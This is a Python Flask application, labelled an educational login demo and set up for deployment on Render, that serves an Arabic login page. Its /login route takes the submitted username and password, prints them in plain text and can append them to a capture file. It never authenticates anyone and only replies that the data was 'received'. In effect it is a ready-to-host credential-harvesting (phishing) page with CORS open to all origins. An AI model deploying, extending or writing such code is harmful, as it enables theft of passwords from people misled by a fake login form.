"""
Render-ready Flask application for the educational login demo.
This file exposes the web app so Render can run it with Gunicorn.
"""

import time
from pathlib import Path

from flask import Flask, jsonify, request
from flask_cors import CORS

app = Flask(__name__)
CORS(app)
app.config["CAPTURE_FILE"] = None


@app.route("/", methods=["GET"])
def index():
    """صفحة تسجيل دخول تجريبية"""
    return """
    <!DOCTYPE html>
    <html dir="rtl" lang="ar">
    <head><meta charset="UTF-8"><title>تسجيل دخول تجريبي</title></head>
    <body style="font-family:Arial; max-width:400px; margin:50px auto;">
        <h2>🔐 تسجيل الدخول (نسخة تجريبية)</h2>
        <form action="/login" method="POST">
            <input type="text" name="username" placeholder="اسم المستخدم"
                   required style="width:100%;padding:8px;margin:5px 0;"><br>
            <input type="password" name="password" placeholder="كلمة المرور"
                   required style="width:100%;padding:8px;margin:5px 0;"><br>
            <button type="submit" style="width:100%;padding:10px;background:#007bff;color:#fff;border:none;">دخول</button>
        </form>
    </body>
    </html>
    """


@app.route("/login", methods=["POST", "GET"])
def login():
    """يستقبل بيانات تسجيل الدخول ويخزنها إذا تم تمكين الحفظ"""
    if request.is_json:
        data = request.get_json(silent=True) or {}
        username = str(data.get("username", ""))
        password = str(data.get("password", ""))
    else:
        username = str(request.form.get("username", ""))
        password = str(request.form.get("password", ""))

    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    line = f"[{timestamp}] {username} : {password}"
    print(f"[+] {line}")

    capture_file = app.config.get("CAPTURE_FILE")
    if capture_file:
        capture_path = Path(capture_file)
        capture_path.parent.mkdir(parents=True, exist_ok=True)
        with capture_path.open("a", encoding="utf-8") as file_handle:
            file_handle.write(f"{timestamp}\t{username}\t{password}\n")

    return jsonify({"status": "received", "username": username}), 200


def run_local_server(local_port: int = 5001):
    """تشغيل التطبيق محليًا عند الحاجة"""
    print(f"[*] السيرفر المحلي يعمل على http://localhost:{local_port}")
    app.run(host="127.0.0.1", port=local_port, debug=False, use_reloader=False)


if __name__ == "__main__":
    run_local_server()
